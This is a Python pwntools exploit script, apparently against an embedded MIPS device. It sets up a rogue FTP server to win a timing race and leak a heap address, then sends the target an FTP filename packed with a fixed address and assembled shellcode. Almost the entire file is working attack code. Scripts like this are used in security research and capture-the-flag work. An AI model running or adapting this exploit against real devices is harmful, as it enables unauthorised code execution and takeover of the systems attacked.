#!/usr/bin/env python3

import pwn
import struct as s
from time import sleep
from common import info, readResp, sendFtpPkt

from config import *

def handleFtp1(ftpd):
    #   send header
    ftpd.sendline(b'220 ProFTPD Server ')

def handleFtp2(ftpd):
    #   USER
    info("Waiting for USER")
    u = ftpd.readline()
    info(u)
    ftpd.sendline(b'331 Login ok, gimme passwd')
    info("Waiting for PASS")
    #   PASS
    p = ftpd.readline()
    info(p)
    ftpd.sendline(b'230-Welcome, ftp victim')
    #   PWD
    info("Waiting for PWD")
    l = ftpd.readline()
    info(l)
    return (u, p, l)

def doSlowFtp(ftpd):
    info("Slow FTP")
    handleFtp1(ftpd)
    #   add delay so that another thread
    #   can cause mayhem
    info("Sleeping!")
    #   that's the timeout in Alloca
    sleep(5)
    #   just kill the connection
    ftpd.close()

def doLeakyFtp(ftpd, withSize=True, pwd=b"/"):
    info("Leaky FTP")
    handleFtp1(ftpd)
    (u, p, l) = handleFtp2(ftpd)
    respBuf = b'257 "/" is the current directory'
    ftpd.sendline(respBuf)
    #   SIZE which leaks heap address
    info("Waiting for LEAKY size")
    l = ftpd.readline()
    info(l)
    addr = l[5+128+6:].strip()
    info(len(addr),addr)
    addr = addr[32:][:4]
    while len(addr) < 4:
        addr += b'\0'
    addr = s.unpack('<I', addr)[0]
    info(hex(addr))
    ftpd.close()
    return addr

def otherleakHeapByFtp(r, ftpd, shellcode=""):
    filename = b'A'*4
    filename += s.pack('<I', 0x7fff7020)
    filename += b'A'*(3*4)
    asm = pwn.asm(shellcode)
    info("Stage1 len:",len(asm))
    asm += b'A' * (154-len(asm))
    filename += asm
    sendFtpPkt(r, u=b'u'*16, p=b'p'*16, filename=filename)
    doSlowFtp(ftpd.next_connection())
    addr = doLeakyFtp(ftpd.next_connection())
    return addr

def leakHeapByFtp(r, ftpd, shellcode=""):
    #   request update from FTP server
    sendFtpPkt(r)
    readResp(r)
    return otherleakHeapByFtp(r, ftpd, shellcode)

def main():
    pwn.context.update(os='linux', arch='mips')
    r = pwn.remote(remoteIp, remotePort)

    #   FTP attempts
    ftpd = pwn.server(localPort, localIp)
    ftpd.newline = b'\r\n'

    leakHeapByFtp(r, ftpd)

    info("DONE")
    ftpd.close()
    r.close()

if __name__ == "__main__":
    main()
